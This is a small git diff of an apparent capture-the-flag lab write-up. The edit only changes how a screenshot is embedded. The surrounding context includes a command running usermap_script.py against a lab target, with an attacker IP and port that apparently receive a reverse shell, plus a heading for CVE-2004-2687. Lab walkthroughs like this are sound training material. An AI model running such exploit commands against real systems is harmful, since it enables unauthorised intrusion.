@@ -162,7 +162,7 @@ user:[uucp] rid:[0x3fc]
 
 `kali@kali:/$ ./usermap_script.py 10.10.10.3 139 10.10.14.13 3333`
 
-![[Screen Shot 2022-12-19 at 10.36.35 PM.png|500]]
+<img src="https://github.com/ChrisThePhotographer/test/blob/main/assets/Screen Shot 2022-12-19 at 10.36.35 PM.png" width=50% height=50%>
 ![[Screen Shot 2022-12-19 at 10.37.01 PM.png|500]]
 
 ##### Exploitation #2: CVE-2004-2687
